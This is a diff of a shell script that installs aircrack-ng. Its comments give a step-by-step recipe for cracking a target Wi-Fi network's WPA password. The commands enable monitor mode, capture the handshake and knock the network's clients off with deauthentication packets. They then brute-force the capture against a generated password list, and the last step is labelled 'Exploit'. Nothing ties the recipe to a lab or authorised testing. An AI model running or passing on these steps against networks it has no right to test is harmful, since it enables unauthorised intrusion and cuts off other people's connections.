@@ -4,11 +4,16 @@ sudo apt install aircrack-ng --yes
 
 
 #TODO
-#iwconfig 															| To show the network adapter name
-#sudo airodump-ng {{NETWORK ADAPTER NAME}} 														| To scann the wireless networks available
-#																| ** Save the BSSID of the target network
-#sudo airodump-ng --bssid {{TARGET BSSID}} --channel {{TARGET NETWORK CHANNEL}} --write wpa-crack {{NETWORK ADAPTER NAME}}	| To make the handsahke **Leave it until the font color turns red
-#sudo aireplay-ng --deauth 20 -a {{TARGET BSSID}} {{NETWORK ADAPTER NAME}}							| TO send the handshake 
-#sudo vim wordlist.txt 														| To create the Key words list
-#sudo aircrack-ng -w wordlist.txt wpa-crack-01.cap
-#sudo crunch 8 8 | aircrack-ng -w - -b {{TARGET BSSID}} wpa-crack-01.cap							| Exploit
+# sudo iwconfig 													| Shows the network card name
+# sudo airmon-ng check kill												| Stop current processes that are using WIFI interface 
+# sudo airmon-ng start {{Network Card Name}}   										| Start the network card in Monitor Mode
+# sudo iwconfig 													| Shows the Network Card Name **It changed after last step
+# sudo airodump-ng {{Network Card Name}}										| View all the WIFI networks arround
+# sudo airodump-ng -c {{Target Network Channel}} --bssid {{Target Network BSSID}} -w /root {{Network Card Name}}  	| View the clients connected to the target network **Wait until it shows the "Hand Shanke"
+# sudo aireplay-ng -0 10 -a {{Target Network BSSID}} {{Network Card Name}}  						| On a new terminal:  Disconnect the clients connected to the target network
+# sudo aircrack-ng -a2 -b {{Target Network BSSID}} -w pwd.txt {{ .cap file }}  						| Exploit
+
+#   PASSWORD GENERATOR 
+# sudo gcc pgen.c 													| Execute the Random Password Generator
+# sudo ./a.out >> pwd.txt												| write the output of the Password Generator on the pwd.txt file 
+
